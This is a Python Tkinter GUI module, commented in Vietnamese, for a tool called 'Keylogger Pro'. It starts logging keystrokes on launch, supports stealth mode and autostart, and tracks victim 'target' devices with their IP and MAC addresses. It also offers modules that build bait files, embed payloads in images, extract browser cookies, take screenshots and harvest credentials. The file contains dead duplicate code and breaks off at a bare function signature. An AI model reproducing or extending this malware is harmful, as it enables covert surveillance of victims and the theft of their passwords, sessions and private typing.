#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Module quản lý giao diện người dùng chính của ứng dụng Keylogger
"""

import os
import sys
import time
import queue
import logging
import threading
import tkinter as tk
from tkinter import ttk, messagebox, filedialog

from typing import Dict, Any, List, Optional, Callable, Union, Tuple

# Import các module core
from core.database import Database
from core.keylogger import Keylogger
from core.system_info import SystemInfo
import core.utils as utils

# Import các module trích xuất
from extractors.browser_cookie_extractor import BrowserCookieExtractor

# Import các module tạo file mồi
from generators.bait_generator import BaitFileGenerator

# Import các module UI
from gui.resources import UIResources
from gui.frames.keylogger_frame import KeyloggerFrame
from gui.frames.management_frame import ManagementFrame
from gui.frames.bait_frame import BaitFrame
from gui.frames.cookie_frame import CookieFrame
from gui.frames.settings_frame import SettingsFrame
from gui.frames.about_frame import AboutFrame
from gui.frames.screenshot_frame import ScreenshotFrame
# Thêm vào phần import các module trích xuất (khoảng dòng 20)
from extractors.browser_cookie_extractor import BrowserCookieExtractor
# Thêm dòng mới ở đây:
from extractors.memory_dump import MemoryDumper
from extractors.credential_harvester import CredentialHarvester


# Import cấu hình
from config import config

logger = logging.getLogger("keylogger.gui.app")


class ModernKeyloggerApp:
    """Ứng dụng giao diện người dùng chính cho Keylogger."""

    def __init__(self, root):
        """Khởi tạo ứng dụng Keylogger với giao diện hiện đại.
       
       Args:
           root: Widget gốc (Tk hoặc Toplevel) để chứa ứng dụng
       """
        self.root = root
        self.root.title("Keylogger Pro")
        self.root.geometry("900x650")
        self.root.minsize(800, 600)

        # Áp dụng style
        try:
            import ttkbootstrap as ttk
            self.style = ttk.Style(theme="lumen")  # Themes: lumen, darkly, superhero, solar, ...
            self.is_dark_mode = False  # Theme sáng mặc định
        except ImportError:
            self.style = ttk.Style()  # Sử dụng ttk tiêu chuẩn
            self.is_dark_mode = False

        # Queue để giao tiếp giữa các luồng và UI
        self.ui_queue = queue.Queue()

        # Biến trạng thái
        self.is_recording = False
        self.keylogger = None
        self.database = None

        # Khởi tạo database
        self.init_database()

        # Tạo layout chính
        self.create_main_layout()

        # Tạo sidebar
        self.create_sidebar()

        # Tạo các frame nội dung
        self.create_frames()

        # Tạo thanh trạng thái
        self.create_status_bar()

        # Mặc định hiển thị frame keylogger
        self.show_frame("keylogger")

        # Thiết lập kiểm tra UI queue định kỳ
        self.process_ui_queue()

        # Khởi động keylogger
        try:
            from datetime import datetime
            log_path = os.path.join(os.path.expanduser("~"), ".keylogger",
                                    f"gui_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")
            self.keylogger = Keylogger(
                log_file=log_path,
                database=self.database,
                callback=self._update_log_display
            )

            self.keylogger.start()
            self.is_recording = True
            logger.info("Đã khởi động keylogger thành công")
        except Exception as e:
            import traceback
            logger.error("Lỗi khi khởi động keylogger:\n" + traceback.format_exc())
            messagebox.showerror("Lỗi", "Không thể khởi động keylogger.")

        # Thiết lập sự kiện đóng cửa sổ
        self.root.protocol("WM_DELETE_WINDOW", self.on_close)

    def process_ui_queue(self) -> None:
        """Xử lý các sự kiện từ queue để cập nhật UI an toàn."""
        try:
            while not self.ui_queue.empty():
                task = self.ui_queue.get(block=False)
                # Task là một tuple (function, args, kwargs)
                func, args, kwargs = task
                func(*args, **kwargs)
        except queue.Empty:
            pass
        finally:
            # Lập lịch kiểm tra lại sau 100ms
            self.root.after(100, self.process_ui_queue)

    def update_ui(self, func, *args, **kwargs) -> None:
        """Thêm một task vào queue để cập nhật UI từ luồng khác."""
        self.ui_queue.put((func, args, kwargs))

    def _update_log_display(self, log_entry: str):
        def append_log():
            try:
                # Tìm đối tượng KeyloggerFrame
                if hasattr(self, "frame_widgets") and "keylogger" in self.frame_widgets:
                    keylogger_frame = self.frame_widgets["keylogger"]
                    if hasattr(keylogger_frame, "update_log"):
                        keylogger_frame.update_log(log_entry)
                        return

                # Backup: Tìm trực tiếp widget
                frame = self.frames.get("keylogger")
                if frame:
                    # Tìm LabelFrame "Nhật ký phím"
                    for child in frame.winfo_children():
                        if isinstance(child, ttk.LabelFrame) and child.cget("text") == "Nhật ký phím":
                            # Tìm trong container
                            for container in child.winfo_children():
                                for widget in container.winfo_children():
                                    if isinstance(widget, tk.Text):
                                        widget.insert(tk.END, log_entry + "\n")
                                        widget.see(tk.END)
                                        return

                logger.debug(f"Không tìm thấy widget để hiển thị log: {log_entry}")
            except Exception as e:
                import traceback
                logger.error(f"Lỗi khi cập nhật giao diện keylog: {e}")
                logger.error(traceback.format_exc())

        self.update_ui(append_log)

    def on_close(self) -> None:
        """Xử lý sự kiện đóng ứng dụng."""
        # Dừng keylogger nếu đang chạy
        if self.keylogger and self.keylogger.running:
            self.keylogger.stop()
        # Đóng phiên làm việc của screenshot
        if hasattr(self, 'screenshot_frame'):
            self.screenshot_frame.on_closing()

        # Đóng cửa sổ
        self.root.destroy()

    def init_database(self) -> None:
        """Khởi tạo cơ sở dữ liệu."""
        try:
            self.database = Database(config.get("db_path", config.DEFAULT_DB_PATH))
            logger.info("Đã khởi tạo cơ sở dữ liệu")
        except Exception as e:
            logger.error(f"Lỗi khi khởi tạo database: {e}")
            messagebox.showerror("Lỗi", f"Không thể khởi tạo cơ sở dữ liệu: {e}")

    def create_main_layout(self) -> None:
        """Tạo layout chính cho ứng dụng."""
        # Sử dụng grid layout cho toàn bộ ứng dụng
        self.root.grid_columnconfigure(1, weight=1)
        self.root.grid_rowconfigure(0, weight=1)

        # Container chính
        self.main_container = ttk.Frame(self.root)
        self.main_container.grid(row=0, column=1, sticky="nsew", padx=0, pady=0)
        self.main_container.grid_columnconfigure(0, weight=1)
        self.main_container.grid_rowconfigure(0, weight=1)

    def create_sidebar(self) -> None:
        """Tạo sidebar với các nút chuyển tab."""
        # Sidebar frame
        sidebar_frame = ttk.Frame(self.root, width=200)
        sidebar_frame.grid(row=0, column=0, sticky="ns", padx=0, pady=0)

        # Tiêu đề ứng dụng
        app_title = ttk.Label(
            sidebar_frame, text="KEYLOGGER PRO", font=("Arial", 14, "bold")
        )
        app_title.pack(pady=20, padx=10)

        # Các nút menu
        self.menu_buttons = {}
        menu_items = [
            ("keylogger", "Theo dõi bàn phím", "start"),
            ("manage", "Quản lý thiết bị", "view"),
            ("bait", "Tạo file mồi", "bait"),
            ("cookie", "Trích xuất cookie", "cookie"),
            ("screenshot", "Chụp màn hình", "camera"),  # Thêm mục mới này
            ("credentials", "Thu thập thông tin", "key"),
            ("settings", "Cài đặt", "settings"),
            ("about", "Giới thiệu", "about"),
        ]

        for item_id, item_text, icon_name in menu_items:
            # Tạo frame cho mỗi nút
            btn_frame = ttk.Frame(sidebar_frame)
            btn_frame.pack(fill=tk.X, pady=2, padx=5)

            # Tạo icon
            icon_img = UIResources.get_icon_image(icon_name)
            icon_lbl = ttk.Label(btn_frame, image=icon_img)
            icon_lbl.image = icon_img  # Giữ tham chiếu
            icon_lbl.pack(side=tk.LEFT, padx=5)

            # Tạo nút (sử dụng Label thay vì Button để tùy chỉnh UI)
            btn = ttk.Label(btn_frame, text=item_text, cursor="hand2")
            btn.pack(side=tk.LEFT, fill=tk.X, padx=5, pady=8)

            # Lưu vào từ điển để dễ quản lý
            self.menu_buttons[item_id] = {
                "frame": btn_frame,
                "button": btn,
                "icon": icon_lbl,
            }

            # Thiết lập sự kiện khi click
            btn.bind("<Button-1>", lambda e, id=item_id: self.show_frame(id))
            btn_frame.bind("<Button-1>", lambda e, id=item_id: self.show_frame(id))
            icon_lbl.bind("<Button-1>", lambda e, id=item_id: self.show_frame(id))

        # Thêm nút chuyển đổi theme sáng/tối
        self.theme_toggle_frame = ttk.Frame(sidebar_frame)
        self.theme_toggle_frame.pack(side=tk.BOTTOM, fill=tk.X, pady=10, padx=5)

        self.theme_icon = UIResources.get_icon_image("theme")
        self.theme_btn = ttk.Button(
            self.theme_toggle_frame,
            image=self.theme_icon,
            text=" Chuyển chủ đề",
            compound=tk.LEFT,
            command=self.toggle_theme,
        )
        self.theme_btn.image = self.theme_icon
        self.theme_btn.pack(fill=tk.X, padx=5, pady=5)

    def create_frames(self) -> None:
        """Tạo các frame nội dung cho từng tab."""
        # Container cho các frame
        self.frames = {}
        self.frame_widgets = {}  # Lưu đối tượng và widget

        # Tạo các frame con với callback là hàm frame_callback
        keylogger_frame_obj = KeyloggerFrame(
            self.main_container, callback=self.frame_callback
        )
        self.frames["keylogger"] = keylogger_frame_obj.get_frame()
        self.frame_widgets["keylogger"] = keylogger_frame_obj

        self.frames["manage"] = ManagementFrame(
            self.main_container, callback=self.frame_callback
        ).get_frame()

        self.frames["bait"] = BaitFrame(
            self.main_container, callback=self.frame_callback
        ).get_frame()

        self.frames["cookie"] = CookieFrame(
            self.main_container, callback=self.frame_callback
        ).get_frame()

        self.frames["settings"] = SettingsFrame(
            self.main_container, callback=self.frame_callback
        ).get_frame()

        self.frames["about"] = AboutFrame(
            self.main_container, callback=self.frame_callback
        ).get_frame()
        # Thêm frame chụp màn hình
        self.screenshot_frame = ScreenshotFrame(self.main_container)  # Hoặc parent phù hợp
        screenshot_tab = self.screenshot_frame  # Vì ScreenshotFrame thừa kế từ ttk.Frame
        self.frames["screenshot"] = screenshot_tab
        self.frame_widgets["screenshot"] = self.screenshot_frame

        def create_frames(self) -> None:
            """Tạo các frame nội dung cho từng tab."""
            # Container cho các frame
            self.frames = {}
            self.frame_widgets = {}  # Lưu đối tượng và widget

            # Tạo các frame con với callback là hàm frame_callback
            keylogger_frame_obj = KeyloggerFrame(
                self.main_container, callback=self.frame_callback
            )
            self.frames["keylogger"] = keylogger_frame_obj.get_frame()
            self.frame_widgets["keylogger"] = keylogger_frame_obj

            # ... (các frame khác) ...

            # Thêm frame chụp màn hình
            self.screenshot_frame = ScreenshotFrame(self.main_container)
            screenshot_tab = self.screenshot_frame
            self.frames["screenshot"] = screenshot_tab
            self.frame_widgets["screenshot"] = self.screenshot_frame

            # Thêm mới: Frame Credentials
            # Import module
            from gui.frames.credentials_frame import CredentialsFrame
            # Khởi tạo frame
            self.credentials_frame = CredentialsFrame(self.main_container, callback=self.frame_callback)
            # Đăng ký frame với ứng dụng
            credentials_tab = self.credentials_frame.get_frame()
            self.frames["credentials"] = credentials_tab
            self.frame_widgets["credentials"] = self.credentials_frame


    def show_frame(self, frame_id: str) -> None:
        """Hiển thị frame theo ID và cập nhật trạng thái nút."""
        # Ẩn tất cả các frame
        for f in self.frames.values():
            f.grid_remove()

        # Hiển thị frame được chọn
        if frame_id in self.frames:
            self.frames[frame_id].grid(row=0, column=0, sticky="nsew")

        # Cập nhật trạng thái nút
        for btn_id, widgets in self.menu_buttons.items():
            if btn_id == frame_id:
                widgets["frame"].configure(style="Selected.TFrame")
                widgets["button"].configure(style="Selected.TLabel")
            else:
                widgets["frame"].configure(style="TFrame")
                widgets["button"].configure(style="TLabel")

    def create_status_bar(self) -> None:
        """Tạo thanh trạng thái ở dưới cùng."""
        self.status_var = tk.StringVar(value="Sẵn sàng")
        status_bar = ttk.Label(
            self.root, textvariable=self.status_var, relief=tk.SUNKEN, anchor=tk.W
        )
        status_bar.grid(row=1, column=0, columnspan=2, sticky="ew")

    def toggle_theme(self) -> None:
        """Chuyển đổi giữa chủ đề sáng và tối."""
        try:
            if hasattr(self, "style") and hasattr(self.style, "theme_use"):
                current_theme = self.style.theme_use()

                if current_theme in ["darkly", "solar", "superhero", "cyborg"]:
                    # Đang ở chế độ tối, chuyển sang sáng
                    self.style.theme_use("lumen")
                    self.is_dark_mode = False

                    # Cập nhật icon
                    self.theme_icon = UIResources.get_icon_image("light_theme")
                    self.theme_btn.configure(image=self.theme_icon)
                    self.theme_btn.image = self.theme_icon

                    # Cập nhật cài đặt
                    config.set("theme", "light")
                else:
                    # Đang ở chế độ sáng, chuyển sang tối
                    self.style.theme_use("darkly")
                    self.is_dark_mode = True

                    # Cập nhật icon
                    self.theme_icon = UIResources.get_icon_image("light_theme")
                    self.theme_btn.configure(image=self.theme_icon)
                    self.theme_btn.image = self.theme_icon

                    # Cập nhật cài đặt
                    config.set("theme", "dark")

                # Lưu cài đặt
                config.save_settings()
        except Exception as e:
            logger.error(f"Lỗi khi chuyển đổi chủ đề: {e}")

            # Fallback nếu không dùng ttkbootstrap
            try:
                if hasattr(self, "is_dark_mode"):
                    if not self.is_dark_mode:
                        # Chuyển sang chế độ tối
                        self.apply_theme("dark")
                        self.is_dark_mode = True

                        # Cập nhật icon
                        self.theme_icon = UIResources.get_icon_image("light_theme")
                        self.theme_btn.configure(image=self.theme_icon)
                        self.theme_btn.image = self.theme_icon

                        # Cập nhật cài đặt
                        config.set("theme", "dark")
                    else:
                        # Chuyển sang chế độ sáng
                        self.apply_theme("light")
                        self.is_dark_mode = False

                        # Cập nhật icon
                        self.theme_icon = UIResources.get_icon_image("dark_theme")
                        self.theme_btn.configure(image=self.theme_icon)
                        self.theme_btn.image = self.theme_icon

                        # Cập nhật cài đặt
                        config.set("theme", "light")

                    # Lưu cài đặt
                    config.save_settings()
            except Exception as e:
                logger.error(f"Lỗi khi chuyển đổi chủ đề (fallback): {e}")

    def apply_theme(self, theme_name: str) -> None:
        """Áp dụng chủ đề tùy chỉnh (fallback khi không dùng ttkbootstrap).
       
       Args:
           theme_name: Tên chủ đề ('light' hoặc 'dark')
       """
        theme = UIResources.get_theme(theme_name)

        # Áp dụng màu sắc cho các widget
        self.root.configure(bg=theme["bg"])
        for frame in self.frames.values():
            frame.configure(bg=theme["bg"])

            # Áp dụng cho tất cả các widget con
            for widget in frame.winfo_children():
                widget_type = widget.winfo_class()
                if widget_type in ["Frame", "LabelFrame", "TFrame", "TLabelFrame"]:
                    widget.configure(bg=theme["bg"])
                elif widget_type in ["Label", "TLabel"]:
                    widget.configure(bg=theme["bg"], fg=theme["fg"])
                elif widget_type in ["Button", "TButton"]:
                    widget.configure(bg=theme["btn_bg"], fg=theme["btn_fg"])
                elif widget_type in ["Entry", "TEntry"]:
                    widget.configure(bg=theme["entry_bg"], fg=theme["entry_fg"])
                elif widget_type in ["Text"]:
                    widget.configure(bg=theme["entry_bg"], fg=theme["entry_fg"])

    def frame_callback(self, data: Dict[str, Any]) -> None:
        """Xử lý callback từ các frame thành phần.
       
       Args:
           data: Dữ liệu từ callback (thường chứa action và các tham số khác)
       """
        # Kiểm tra action
        if "action" not in data:
            return

        action = data["action"]

        # Phân loại và xử lý theo action
        if action == "update_status":
            # Cập nhật thanh trạng thái
            self.status_var.set(data.get("message", ""))

        elif action == "start_keylogger":
            # Bắt đầu keylogger
            self.start_keylogger(
                data.get("log_path", ""),
                data.get("auto_start", False),
                data.get("stealth_mode", True)
            )

        elif action == "stop_keylogger":
            # Dừng keylogger
            self.stop_keylogger()

        elif action == "clear_log":
            # Xóa log
            if self.keylogger:
                with open(self.keylogger.log_file, "w", encoding="utf-8") as f:
                    f.write("")
            self.status_var.set("Đã xóa nhật ký")

        elif action == "get_targets":
            # Lấy danh sách targets
            callback_func = data.get("callback")
            if callback_func and self.database:
                targets = self.database.get_all_targets()
                callback_func(targets)

        elif action == "get_target_details":
            # Lấy thông tin chi tiết của một target
            target_id = data.get("target_id")
            callback_func = data.get("callback")
            if callback_func and self.database and target_id:
                target = self.database.get_target_by_id(target_id)
                callback_func(target)

        elif action == "view_target_data":
            # Xem dữ liệu của một target
            self.view_target_data(data.get("target_id"))

        elif action == "delete_target":
            # Xóa một target
            target_id = data.get("target_id")
            callback_func = data.get("callback")
            if self.database and target_id:
                success = self.database.delete_target(target_id)
                if callback_func:
                    message = "Đã xóa thiết bị và dữ liệu liên quan" if success else "Không thể xóa thiết bị"
                    callback_func(success, message)

        elif action == "export_target_data":
            # Xuất dữ liệu của một target
            target_id = data.get("target_id")
            file_path = data.get("file_path")
            callback_func = data.get("callback")
            self.export_target_data(target_id, file_path, callback_func)

        elif action == "open_file":
            # Mở file bằng ứng dụng mặc định
            file_path = data.get("file_path")
            if file_path and os.path.exists(file_path):
                utils.open_file(file_path)

        elif action == "create_bait_file":
            # Tạo file mồi
            self.create_bait_file(
                data.get("file_path", ""),
                data.get("log_path", ""),
                data.get("stealth_mode", True),
                data.get("auto_start", False),
                data.get("bait_type", ""),
                data.get("required_packages", []),
                data.get("callback")
            )

        elif action == "embed_to_image":
            # Nhúng mã vào ảnh
            self.embed_to_image(
                data.get("source_image", ""),
                data.get("output_path", ""),
                data.get("log_path", ""),
                data.get("stealth_mode", True),
                data.get("auto_start", False),
                data.get("callback")
            )

        elif action == "extract_cookies":
            # Trích xuất cookie
            self.extract_cookies(
                data.get("output_dir", ""),
                data.get("callback")
            )

        elif action == "get_settings":
            # Lấy cài đặt
            callback_func = data.get("callback")
            if callback_func:
                settings = config.settings
                callback_func(settings)

        elif action == "save_settings":
            # Lưu cài đặt
            settings = data.get("settings", {})
            callback_func = data.get("callback")

            for key, value in settings.items():
                config.set(key, value)

            success = config.save_settings()

            if callback_func:
                message = "Đã lưu cài đặt thành công" if success else "Không thể lưu cài đặt"
                callback_func(success, message)
                self.status_var.set(message)

        elif action == "load_default_settings":
            # Khôi phục cài đặt mặc định
            config.reset_to_default()
            callback_func = data.get("callback")
            if callback_func:
                callback_func(config.settings)
            self.status_var.set("Đã khôi phục cài đặt mặc định")

        elif action == "toggle_theme":
            # Chuyển đổi chủ đề
            self.toggle_theme()

    def start_keylogger(self, log_path: str, auto_start: bool, stealth_mode: bool) -> None:
        """Bắt đầu theo dõi bàn phím.
       
       Args:
           log_path: Đường dẫn lưu file log
           auto_start: Tự động khởi động cùng hệ thống
           stealth_mode: Chế độ ẩn
       """
        if self.keylogger and self.keylogger.running:
            messagebox.showinfo("Thông báo", "Keylogger đang hoạt động!")
            return

        try:
            # Tạo thư mục nếu chưa tồn tại
            log_dir = os.path.dirname(os.path.abspath(log_path))
            os.makedirs(log_dir, exist_ok=True)

            # Thiết lập tự động khởi động nếu cần
            if auto_start:
                script_path = os.path.abspath(sys.argv[0])
                utils.setup_autostart(script_path, stealth_mode)

            # Khởi tạo keylogger
            self.keylogger = Keylogger(
                log_path,
                callback=self.update_log,
                database=self.database
            )

            # Cập nhật cài đặt buffer từ config
            self.keylogger.max_buffer_size = config.get("buffer_size", 20)
            self.keylogger.flush_interval = config.get("flush_interval", 5.0)

            # Bắt đầu keylogger
            self.keylogger.start()

            # Cập nhật UI
            self.is_recording = True
            self.status_var.set("Đang theo dõi bàn phím...")

            # Tìm frame keylogger và cập nhật log
            for frame_id, frame in self.frames.items():
                if frame_id == "keylogger":
                    for child in frame.winfo_children():
                        if hasattr(child, "update_log"):
                            with open(log_path, "r", encoding="utf-8") as f:
                                log_content = f.read()
                                for line in log_content.splitlines():
                                    child.update_log(line + "\n")
                    break


        except Exception as e:
            logger.error(f"Lỗi khi khởi động keylogger: {e}")
            messagebox.showerror("Lỗi", f"Không thể khởi động keylogger: {e}")

    def stop_keylogger(self) -> None:
        """Dừng theo dõi bàn phím."""
        if self.keylogger and self.keylogger.running:
            try:
                self.keylogger.stop()

                # Cập nhật UI
                self.is_recording = False
                self.status_var.set("Đã dừng theo dõi bàn phím")

            except Exception as e:
                logger.error(f"Lỗi khi dừng keylogger: {e}")
                messagebox.showerror("Lỗi", f"Không thể dừng keylogger: {e}")

    def update_log(self, key_event: str) -> None:
        """Cập nhật log hiển thị khi có keystroke mới.

        Args:
            key_event: Sự kiện bàn phím
        """
        # Tìm đến đối tượng KeyloggerFrame
        for frame_id, frame_obj in self.frames.items():
            if frame_id == "keylogger":
                # Tìm trong các widget con của frame
                for child in frame_obj.winfo_children():
                    if isinstance(child, ttk.LabelFrame) and child.cget("text") == "Nhật ký phím":
                        for container in child.winfo_children():
                            for widget in container.winfo_children():
                                if isinstance(widget, tk.Text):
                                    widget.insert(tk.END, key_event + "\n")
                                    widget.see(tk.END)
                                    return

        # Log lỗi nếu không tìm thấy widget
        logger.error(f"Không thể tìm thấy widget để hiển thị log: {key_event}")

    def view_target_data(self, target_id: int) -> None:
        """Xem dữ liệu của một target.
       
       Args:
           target_id: ID của target cần xem
       """
        if not target_id or not self.database:
            return

        try:
            # Lấy thông tin target
            target = self.database.get_target_by_id(target_id)
            if not target:
                messagebox.showerror("Lỗi", "Không tìm thấy thông tin thiết bị")
                return

            # Lấy dữ liệu keystroke
            keystrokes = self.database.get_keystrokes_for_target(target_id)

            # Tạo cửa sổ mới để hiển thị dữ liệu
            data_window = tk.Toplevel(self.root)
            data_window.title(f"Dữ liệu của thiết bị {target['device_name']}")
            data_window.geometry("800x600")

            # Áp dụng theme nếu dùng ttkbootstrap
            try:
                if hasattr(self, "style") and hasattr(self.style, "theme_use"):
                    from ttkbootstrap import Style

                    style = Style(data_window)
                    style.theme_use(self.style.theme_use())
            except:
                pass

            # Hiển thị thông tin target
            info_frame = ttk.LabelFrame(data_window, text="Thông tin thiết bị")
            info_frame.pack(fill=tk.X, padx=10, pady=5)

            info_text = f"Tên thiết bị: {target['device_name']} | "
            info_text += f"Người dùng: {target['username']} | "
            info_text += f"IP: {target['ip_address']} | "
            info_text += f"OS: {target['os_info']}"

            ttk.Label(info_frame, text=info_text, wraplength=780).pack(padx=5, pady=5)

            # Frame tìm kiếm và lọc
            filter_frame = ttk.Frame(data_window)
            filter_frame.pack(fill=tk.X, padx=10, pady=5)

            ttk.Label(filter_frame, text="Tìm kiếm:").pack(side=tk.LEFT, padx=5)
            search_data_var = tk.StringVar()
            search_data_entry = ttk.Entry(
                filter_frame, textvariable=search_data_var, width=30
            )
            search_data_entry.pack(side=tk.LEFT, padx=5)

            # Lọc theo ứng dụng
            ttk.Label(filter_frame, text="Ứng dụng:").pack(side=tk.LEFT, padx=5)
            app_filter_var = tk.StringVar()

            # Lấy danh sách các ứng dụng duy nhất
            apps = set()
            for ks in keystrokes:
                if ks["application"]:
                    apps.add(ks["application"])

            app_combobox = ttk.Combobox(
                filter_frame,
                textvariable=app_filter_var,
                values=["Tất cả"] + list(apps),
                width=25,
                state="readonly",
            )
            app_combobox.current(0)  # Default: "Tất cả"
            app_combobox.pack(side=tk.LEFT, padx=5)

            # Nút áp dụng bộ lọc
            from tkinter import scrolledtext

            # Frame hiển thị dữ liệu
            data_frame = ttk.LabelFrame(data_window, text="Nhật ký bàn phím")
            data_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

            # Textbox hiển thị dữ liệu với thanh cuộn
            data_text = scrolledtext.ScrolledText(
                data_frame, wrap=tk.WORD, font=("Consolas", 10)
            )
            data_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

            # Tạo tag highlight cho tìm kiếm
            data_text.tag_configure("highlight", background="yellow")
            data_text.tag_configure(
                "app_header", foreground="blue", font=("Arial", 10, "bold")
            )

            # Hàm search và filter
            def search_filter():
                # Xóa nội dung hiện tại
                data_text.delete(1.0, tk.END)

                search_text = search_data_var.get().lower()
                app_filter = app_filter_var.get()

                # Lọc dữ liệu
                filtered_data = keystrokes
                if app_filter != "Tất cả":
                    filtered_data = [ks for ks in keystrokes if ks["application"] == app_filter]

                # Hiển thị dữ liệu
                current_app = None
                for ks in reversed(filtered_data):  # Từ cũ đến mới
                    # Kiểm tra tìm kiếm
                    if search_text and search_text not in ks["keypress"].lower():
                        continue

                    # Nếu ứng dụng thay đổi, hiển thị tiêu đề ứng dụng
                    if ks["application"] != current_app:
                        current_app = ks["application"]
                        data_text.insert(tk.END, f"\n=== {current_app} ===\n", "app_header")

                    # Ghi keystroke
                    line = f"[{ks['timestamp']}] {ks['keypress']}\n"
                    data_text.insert(tk.END, line)

                    # Highlight kết quả tìm kiếm
                    if search_text:
                        start_idx = "1.0"
                        while True:
                            start_idx = data_text.search(
                                search_text, start_idx, tk.END, nocase=True
                            )
                            if not start_idx:
                                break
                            end_idx = f"{start_idx}+{len(search_text)}c"
                            data_text.tag_add("highlight", start_idx, end_idx)
                            start_idx = end_idx

            # Nút tìm kiếm
            search_icon = UIResources.get_icon_image("search", size=(16, 16))
            search_btn = ttk.Button(
                filter_frame,
                text="Tìm kiếm",
                image=search_icon,
                compound=tk.LEFT,
                command=search_filter,
            )
            search_btn.image = search_icon
            search_btn.pack(side=tk.LEFT, padx=10)

            # Khi thay đổi combobox
            app_combobox.bind("<<ComboboxSelected>>", lambda e: search_filter())

            # Khi nhấn Enter ở ô tìm kiếm
            search_data_entry.bind("<Return>", lambda e: search_filter())

            # Hiển thị dữ liệu ban đầu
            search_filter()

            # Button frame
            btn_frame = ttk.Frame(data_window)
            btn_frame.pack(fill=tk.X, padx=10, pady=5)

            # Nút xuất dữ liệu
            export_icon = UIResources.get_icon_image("export")
            export_btn = ttk.Button(
                btn_frame,
                text="Xuất dữ liệu",
                image=export_icon,
                compound=tk.LEFT,
                command=lambda: self.frame_callback({
                    "action": "export_target_data",
                    "target_id": target_id,
                    "callback": lambda success, message, path=None: (
                        messagebox.showinfo("Thành công", message) if success
                        else messagebox.showerror("Lỗi", message)
                    )
                }),
            )
            export_btn.image = export_icon
            export_btn.pack(side=tk.LEFT, padx=5)

            # Nút đóng
            close_btn = ttk.Button(btn_frame, text="Đóng", command=data_window.destroy)
            close_btn.pack(side=tk.RIGHT, padx=5)

        except Exception as e:
            logger.error(f"Lỗi khi xem dữ liệu thiết bị: {e}")
            messagebox.showerror("Lỗi", f"Không thể hiển thị dữ liệu: {e}")

    def export_target_data(self, target_id: int, file_path: str, callback_func: Optional[Callable] = None) -> None:
        """Xuất dữ liệu của một target.
       
       Args:
           target_id: ID của target cần xuất dữ liệu
           file_path: Đường dẫn file xuất
           callback_func: Hàm callback sau khi xuất xong
       """
        if not target_id or not self.database or not file_path:
            if callback_func:
                callback_func(False, "Thông tin xuất không hợp lệ")
            return

        try:
            # Lấy thông tin target
            target = self.database.get_target_by_id(target_id)
            if not target:
                if callback_func:
                    callback_func(False, "Không tìm thấy thông tin thiết bị")
                return

            # Lấy dữ liệu keystroke
            keystrokes = self.database.get_keystrokes_for_target(target_id)

            # Tạo thư mục cha nếu chưa tồn tại
            os.makedirs(os.path.dirname(os.path.abspath(file_path)), exist_ok=True)

            # Xuất dữ liệu ra file
            with open(file_path, "w", encoding="utf-8") as f:
                # Ghi thông tin thiết bị
                f.write("=== THÔNG TIN THIẾT BỊ ===\n")
                f.write(f"ID: {target['id']}\n")
                f.write(f"Tên thiết bị: {target['device_name']}\n")
                f.write(f"Người dùng: {target['username']}\n")
                f.write(f"Địa chỉ IP: {target['ip_address']}\n")
                f.write(f"Địa chỉ MAC: {target['mac_address']}\n")
                f.write(f"Hệ điều hành: {target['os_info']}\n")
                f.write(f"Lần đầu kết nối: {target['first_seen']}\n")
                f.write(f"Lần cuối hoạt động: {target['last_seen']}\n")
                f.write("=========================\n\n")

                # Ghi dữ liệu keystroke
                f.write("=== NHẬT KÝ BÀN PHÍM ===\n")

                if keystrokes:
                    current_app = None
                    for ks in reversed(keystrokes):  # Từ cũ đến mới
                        # Nếu ứng dụng thay đổi, hiển thị tiêu đề ứng dụng
                        if ks["application"] != current_app:
                            current_app = ks["application"]
                            f.write(f"\n=== {current_app} ===\n")

                        # Ghi keystroke
                        f.write(f"[{ks['timestamp']}] {ks['keypress']}\n")
                else:
                    f.write("Không có dữ liệu\n")

            # Mã hóa file nếu cài đặt yêu cầu
            if config.get("encrypt_log", False):
                utils.encrypt_file(file_path)

            # Xóa dữ liệu sau khi xuất nếu cài đặt yêu cầu
            if config.get("delete_after_export", False):
                confirm = messagebox.askyesno(
                    "Xác nhận", "Bạn đã chọn xóa dữ liệu sau khi xuất. Tiếp tục xóa?"
                )
                if confirm:
                    self.database.delete_target(target_id)

            # Gọi callback nếu có
            if callback_func:
                callback_func(True, "Đã xuất dữ liệu thành công", file_path)

            self.status_var.set(f"Đã xuất dữ liệu vào: {file_path}")

        except Exception as e:
            logger.error(f"Lỗi khi xuất dữ liệu: {e}")
            if callback_func:
                callback_func(False, f"Không thể xuất dữ liệu: {e}")

    def create_bait_file(self, file_path: str, log_path: str, stealth_mode: bool, auto_start: bool,
                         bait_type: str, required_packages: List[str],
                         callback_func: Optional[Callable] = None) -> None:
        """Tạo file mồi.
       
       Args:
           file_path: Đường dẫn file mồi
           log_path: Đường dẫn lưu log
           stealth_mode: Chế độ ẩn
           auto_start: Tự động khởi động cùng hệ thống
           bait_type: Loại file mồi
           required_packages: Danh sách các package cần thiết
           callback_func: Hàm callback sau khi tạo xong
       """
        # Kiểm tra các package bắt buộc
        if required_packages:
            # Hiển thị cửa sổ tiến trình
            progress_window = tk.Toplevel(self.root)
            progress_window.title("Đang cài đặt thư viện...")
            progress_window.geometry("400x150")
            progress_window.resizable(False, False)

            packages_str = ", ".join(required_packages)
            ttk.Label(progress_window, text=f"Đang cài đặt: {packages_str}").pack(pady=10)

            progress = ttk.Progressbar(progress_window, mode="indeterminate")
            progress.pack(fill=tk.X, padx=20, pady=10)
            progress.start()

            # Cài đặt trong thread riêng
            def install_thread():
                try:
                    success = utils.install_packages(required_packages)

                    # Cập nhật UI từ thread chính
                    self.update_ui(
                        lambda: (
                            progress_window.destroy(),
                            self.create_bait_file_process(file_path, log_path, stealth_mode, auto_start, bait_type,
                                                          callback_func)
                            if success else
                            (callback_func(False, "Không thể cài đặt thư viện cần thiết") if callback_func else None)
                        )
                    )
                except Exception as e:
                    logger.error(f"Lỗi khi cài đặt package: {e}")
                    self.update_ui(
                        lambda: (
                            progress_window.destroy(),
                            callback_func(False, f"Lỗi khi cài đặt thư viện: {e}") if callback_func else None
                        )
                    )

            threading.Thread(target=install_thread, daemon=True).start()

        else:
            # Không cần cài đặt package, tạo file ngay
            self.create_bait_file_process(file_path, log_path, stealth_mode, auto_start, bait_type, callback_func)

    def create_bait_file_process(self, file_path: str, log_path: str, stealth_mode: bool, auto_start: bool,
                                 bait_type: str, callback_func: Optional[Callable] = None) -> None:
